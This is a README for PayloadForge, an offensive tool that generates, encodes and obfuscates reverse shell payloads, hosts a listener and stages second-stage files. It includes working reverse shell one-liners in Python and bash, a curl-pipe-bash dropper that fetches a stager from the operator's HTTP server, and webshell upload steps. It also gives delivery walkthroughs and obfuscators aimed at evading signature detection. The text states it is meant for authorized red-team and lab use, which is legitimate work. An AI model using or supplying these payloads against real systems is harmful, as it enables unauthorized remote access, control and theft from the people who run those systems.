```
                      ___           _,.---,---.,_
                      |         ,;~'             '~;,
                      |       ,;                     ;,
             Frontal  |      ;                         ; ,--- Supraorbital Foramen
              Bone    |     ,'                         /'
                      |    ,;                        /' ;,
                      |    ; ;      .           . <-'  ; |
                      |__  | ;   ______       ______   ;<----- Coronal Suture
                     ___   |  '/~"     ~" . "~     "~\'  |
                     |     |  ~  ,-~~~^~, | ,~^~~~-,  ~  |
           Maxilla,  |      |   |        }:{        | <------ Orbit
          Nasal and  |      |   l       / | \       !   |
          Zygomatic  |      .~  (__,.--" .^. "--.,__)  ~.
            Bones    |      |    ----;' / | \ `;-<--------- Infraorbital Foramen
                     |__     \__.       \/^\/       .__/
                        ___   V| \                 / |V <--- Mastoid Process
                        |      | |T~\___!___!___/~T| |
                        |      | |`IIII_I_I_I_IIII'| |
               Mandible |      |  \,III I I I III,/  |
                        |       \   `~~~~~~~~~~'    /
                        |         \   .       . <-x---- Mental Foramen
                        |__         \.    ^    ./
                                      ^~~~^~~~^
```

# PayloadForge

**Reverse shell generator and listener — by DEDSEC.**

**v0.1.0** · Craft. Obfuscate. Deliver.

PayloadForge generates working reverse shell payloads in 12+ languages, encodes them with 6 encoders, obfuscates them with 9 obfuscators, hosts a matching listener, and serves second-stage files over HTTP. Built for authorized security testing, red team engagements, CTF challenges, and lab work.

---

## ⚠️ Legal disclaimer

**PayloadForge is intended for authorized security testing and educational purposes only.**

You must use it exclusively against systems you own or have **explicit written permission** to test. Unauthorized access to computer systems is a criminal offense under the Computer Fraud and Abuse Act (US), the Computer Misuse Act (UK), and equivalent laws worldwide.

The author (**DEDSEC**) assumes no liability for misuse or damage caused by this tool. You are solely responsible for how you use it. **If you do not have written authorization, do not run this.**

---

## What this tool is

- A **payload generator** — reverse shell one-liners for Linux, macOS, and Windows in the language you choose.
- A **listener** — accepts incoming connections (plain TCP or TLS) and drops you into an interactive shell.
- A **staging server** — hosts second-stage files for chain/dropper payloads.
- A **payload validator** — tests generated payloads locally against `127.0.0.1` before you use them.
- A **library** — hundreds of templates you can inspect, read, modify, and extend.

## What this tool is not

- **Not an exploitation framework.** It doesn't scan or exploit anything. You must already have a way to run code on the target (authorized shell, exploit chain, controlled input field, lab).
- **Not an AV/EDR bypass tool.** Obfuscators raise the cost of naive signature matching. They are not a silver bullet.
- **Not a C2 platform.** No beaconing, persistence, lateral movement, or session management. One-shot payloads.

---

## Install

### From source

```bash
git clone https://github.com/Unknownx007/payloadforge
cd payloadforge
python -m venv .venv
source .venv/bin/activate          # Linux/macOS
# .venv\Scripts\activate           # Windows PowerShell

pip install -e .
```

Requires **Python 3.10+**. PayloadForge itself has only three Python dependencies (`rich`, `prompt_toolkit`, `pyperclip`) — all installed automatically.

### Run

```bash
payloadforge
```

---

## Pre-install requirements

The **payloads you generate** need a matching interpreter on the target:

| Payload language | Linux/macOS target | Windows target |
|---|---|---|
| bash | bash (present) | — |
| python | python3 (usually present) | — |
| perl | perl (usually present) | — |
| ruby | ruby | — |
| php | php-cli | — |
| node | node | — |
| socat | socat | — |
| nc | netcat-openbsd or nmap-ncat | — |
| awk | gawk or mawk | — |
| powershell | — | PowerShell 2.0+ (present) |
| cmd | — | cmd.exe (present) |
| mshta | — | mshta.exe (present) |

### For local testing (`verify` / `testall`)

Install the interpreters on **your** machine:

```bash
# Arch
sudo pacman -S python php ruby socat openbsd-netcat gawk nodejs perl

# Debian / Ubuntu
sudo apt install python3 php-cli ruby socat netcat-openbsd gawk nodejs perl

# Fedora
sudo dnf install python3 php-cli ruby socat nmap-ncat gawk nodejs perl

# macOS
brew install python php ruby socat netcat gawk node perl
```

### Optional: PowerShell Core on Linux

Lets you test Windows payload syntax locally:

```bash
sudo pacman -S powershell         # Arch
brew install --cask powershell    # macOS
```

`pwsh` runs PowerShell Core (.NET), not Windows PowerShell 5.1. It catches syntax and logic bugs; it is not a substitute for real Windows.

---

## Quick start

```bash
payloadforge
```

### 1. Set the listener address

```
[DEDSEC@pf]~[127.0.0.1:4444] $ set lhost 192.168.1.42
[+] lhost = 192.168.1.42
[DEDSEC@pf]~[192.168.1.42:4444] $ set lport 5555
[+] lport = 5555
```

`lhost` is **your** IP — where the target connects back to.

### 2. Browse the catalog

```
[DEDSEC@pf]~[192.168.1.42:5555] $ categories
[DEDSEC@pf]~[192.168.1.42:5555] $ list linux
[DEDSEC@pf]~[192.168.1.42:5555] $ info python3_pty
```

### 3. Generate a payload

```
[DEDSEC@pf]~[192.168.1.42:5555] $ generate python3_pty
```

Output:

```
════════════════════════════════════════════════════════════
python3 -c 'import socket,pty,os;s=socket.socket();s.connect(("192.168.1.42",5555));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
════════════════════════════════════════════════════════════
```

### 4. Start a listener

In one terminal:

```
[DEDSEC@pf]~[192.168.1.42:5555] $ listen
```

### 5. Deliver to the target

On the target system (which you have **written authorization** to test), run the generated payload. The shell connects back to your listener and you're in.

---

## Command reference

| Command | Description |
|---|---|
| `help [cmd]` | Show commands, or help for one |
| `set <key> <value>` | Set `lhost`, `lport`, `http_port`, `encoder`, `obfuscators`, `tls` |
| `show` | Show current options |
| `categories` | List payload categories |
| `list [cat]` | List payloads in a category |
| `info <payload>` | Show payload details |
| `generate <payload> [-o file] [-c]` | Generate payload (`-o` = write to file, `-c` = clipboard) |
| `encoders` | List encoders |
| `obfuscators` | List obfuscators |
| `serve [docroot]` | Start the HTTP payload server |
| `listen [tls]` | Start the TCP or TLS listener |
| `test <payload>` | Test one payload locally |
| `testall [cat]` | Test every testable payload |
| `checkdeps` | Show which interpreters are installed |
| `verify` | Full end-to-end verification of encoders, obfuscators, TLS, chain, web |
| `clear` / `exit` | Clear screen / quit |

---

## Payload categories

| Category | Count | Description |
|---|---|---|
| `linux` | 14 | Reverse shells for Linux/macOS |
| `windows` | 6 | Reverse shells and droppers for Windows |
| `cloud` | 11 | AWS IMDS, S3, SSM, Kubernetes |
| `web` | 9 | JSP, PHP, ASPX webshells and reverse shells |
| `tunnel` | 6 | SSH pivots, SOCKS proxies, chisel |
| `chain` | 6 | HTTP droppers for staged delivery |

### Best Linux payloads

- **`python3_pty`** — fully interactive TTY. Arrow keys, tab completion, Ctrl+C, `sudo`, `su`, `ssh`, `vim` all work.
- **`socat`** — same, if socat is installed.
- **`bash_tcp`** — smallest, most compatible, no TTY.

### Best Windows payloads

- **`powershell_tcp`** — vanilla PowerShell, one-liner, works on any Windows since 7.
- **`cmd_powershell`** — same payload launched via cmd.exe. No `%` characters, so it survives `.bat` files.
- **`powershell_encoded`** — generate with `set encoder utf16le_b64`, wrap in `powershell -e <b64>`.

---

## Delivery methods

**Every example below assumes you have written authorization to run code on the target.** PayloadForge does not find a foothold for you — it takes over once you have one.

### Scenario A — you already have a low-privilege shell

You have a shell on a Linux host and want a full interactive TTY for post-exploitation.

1. On your machine: `set lhost <your-ip>`, `set lport 5555`
2. `listen`
3. On the target, through your existing shell: paste `generate python3_pty` output
4. You now have an interactive shell. Press `Ctrl+]` to disconnect.

### Scenario B — Windows via cmd.exe

Same idea, different payload:

1. `set lhost <your-ip>`, `set lport 5555`
2. `listen`
3. On the target, at an authorized cmd.exe prompt: paste `generate cmd_powershell` output
4. Interactive PowerShell session comes back

### Scenario C — dropper (short initial command)

When you have an input field with a character limit, use a chain payload.

1. `set lhost <your-ip>`, `set lport 5555`, `set http_port 8080`
2. Build your stager: `generate python3_pty -o ~/pf-http/stager.sh`
3. Start the HTTP server: `serve ~/pf-http`
4. Start the listener in another terminal: `listen`
5. On the target, run the short chain payload: paste `generate chain_bash_curl` output
6. The stager downloads over HTTP and connects back

### Scenario D — through a webshell

If you have write access to a web root:

1. `generate php_cmd_shell` (or `jsp_cmd_shell`, `aspx_cmd_shell`)
2. Upload the file
3. Visit `https://target/uploads/shell.php?c=id`
4. For an interactive session: generate `php_reverse`, upload, start `listen`, request the file

### Scenario E — reverse shell through a public IP

Your laptop is behind NAT. Options:

- **Port-forward** on your router: forward `lport` TCP to your laptop, then use your public IP as `lhost`
- **VPS**: run PayloadForge on a cheap VPS with a public IP, use that as `lhost`

---

## HTTP staging (chain payloads)

Chain payloads fetch a second stage. Full walkthrough:

### 1. Prepare the docroot

```bash
mkdir -p ~/pf-http
cd ~/pf-http
```

### 2. Put your stager in it

```
[DEDSEC@pf]~[192.168.1.42:5555] $ generate python3_pty -o ~/pf-http/stager.sh
```

### 3. Start the HTTP server

```
[DEDSEC@pf]~[192.168.1.42:5555] $ set http_port 8080
[DEDSEC@pf]~[192.168.1.42:5555] $ serve ~/pf-http
```

Verify with:

```bash
curl http://192.168.1.42:8080/stager.sh
```

### 4. Start the listener (separate terminal)

```
[DEDSEC@pf]~[192.168.1.42:5555] $ listen
```

### 5. Generate the chain payload

```
[DEDSEC@pf]~[192.168.1.42:5555] $ generate chain_bash_curl
```

Output:

```
curl -s http://192.168.1.42:8080/stager.sh | bash
```

Deliver that to the target. It fetches the stager and you get a shell.

**Note:** generate the stager *after* setting lhost/lport/http_port. Don't change them between generating the stager and running the chain.

---

## Encoders and obfuscators

### Encoders

| Name | Purpose |
|---|---|
| `base64` | Standard base64 |
| `base64_nl` | Base64, newline-stripped |
| `utf16le_b64` | UTF-16LE + base64 — the format PowerShell `-EncodedCommand` expects |
| `hex` | `\x`-prefixed hex |
| `url` | URL percent-encoding |
| `gzip_b64` | Gzip then base64 |
| `rev` | Reversed string |

Use: `set encoder utf16le_b64` then `generate powershell_tcp`.

### Obfuscators

| Name | Target | What it does |
|---|---|---|
| `vars_bash` | bash | Renames `$VARIABLES` to random names |
| `vars_python` | python | Renames single-letter vars, skips quoted text |
| `split_strings_bash` | bash | Splits `"string"` into `"str""ing"` |
| `split_strings_python` | python | Splits into `("str" "ing")` |
| `split_strings_ps` | powershell | Replaces `.` with a marker and reconstructs via `.Replace()` |
| `ps_case_flip` | powershell | Randomizes cmdlet case |
| `ps_backticks` | powershell | Inserts backticks in cmdlet names |
| `ps_concat_chain` | powershell | Combines split + case flip |
| `double_b64` | any | Base64 twice |

Chain them: `set obfuscators split_strings_ps,ps_case_flip`

**Honest limitation:** obfuscators raise the cost of naive signature matching. They do not defeat a modern AV engine or a human analyst reading the payload.

---

## Verified scope

Every feature that can be tested on a single Linux machine has been tested end-to-end.

| Feature | Status |
|---|---|
| 14 Linux reverse shells | ✅ 14/14 verified on Arch Linux |
| Encoders (7) | ✅ 7/7 verified end-to-end |
| Obfuscators (9) | ✅ 9/9 verified end-to-end |
| TLS listener | ✅ Verified with real TLS handshake |
| Chain droppers (4 bash/python) | ✅ 4/4 verified with live HTTP server |
| PHP web payload | ✅ Verified against `php -S` |
| Windows `powershell_tcp` | ✅ Verified on GitHub Actions Windows Server 2022 |
| Windows `cmd_powershell` | ✅ Verified on GitHub Actions Windows Server 2022 |

**Templates, not yet verified against live targets** (require real infrastructure):

- `cloud` — AWS IMDS, S3, SSM, Kubernetes. Requires real EC2 / K8s.
- `tunnel` — SSH reverse/SOCKS/port-forward, chisel. Requires a real SSH server.
- `web` JSP/ASPX — requires Tomcat / IIS.
- `windows` mshta, certutil, IEX — require real Windows; can be added to the CI matrix.
- `chain` powershell/certutil — require real Windows + running HTTP server.

Run `verify` to reproduce the local results on your own machine. Run `testall` to reproduce the Linux payload results.

---

## Troubleshooting

### Payload connects but you get no shell prompt

- The interpreter may be buffering. Try `python3_pty` or `socat` — both allocate a PTY.
- Some bash payloads produce non-interactive shells. Try `bash_readline`.

### Payload doesn't connect at all

- Check the listener's firewall on your machine.
- From the target: `ping <lhost>`.
- If the target is behind NAT: your `lhost` must be your public IP or a VPS.

### `testall` shows SKIP for a language

The interpreter isn't installed. See [Pre-install requirements](#pre-install-requirements). SKIP is not a failure.

### `verify` shows FAIL for an encoder

Check whether the target interpreter is installed (`checkdeps`). If yes, paste the specific failure — most are environment issues.

### TLS listener handshake fails

`openssl` must be in your `PATH`.

### Windows payload authoring

Avoid `%` in Windows templates. In `.bat` context, cmd.exe interprets `%` as a variable reference and will corrupt the payload. Use `ForEach-Object` instead of `%`, and `$env:TEMP` instead of `%TEMP%`.

---

## Adding your own payloads

1. Pick or create a module in `payloadforge/payloads/`
2. Register the payload:

```python
from payloadforge.payloads.registry import register

register(
    "my_shell",
    "linux", "bash",
    "bash -c 'exec 5<>/dev/tcp/{lhost}/{lport}; cat <&5 | while read line; do $line 2>&5 >&5; done'",
    "My custom reverse shell.",
    tags=["tcp", "custom"],
)
```

3. Use `{lhost}`, `{lport}`, `{http_port}` as placeholders
4. Set `testable=True` if it runs against `127.0.0.1` on Linux; otherwise `testable=False` with a `test_note`
5. Import your module in `payloadforge/payloads/__init__.py`

---

## License

AGPL-3.0-or-later. See [LICENSE](LICENSE) and [NOTICE](NOTICE).

The original author credit **DEDSEC** must be preserved in any copy, fork, or derivative work, as required by Section 5 of the AGPL.

---

## Credits

Built by **DEDSEC**.

If you use PayloadForge in a talk, write-up, or course, credit the original repo: `https://github.com/Unknownx007/payloadforge`.
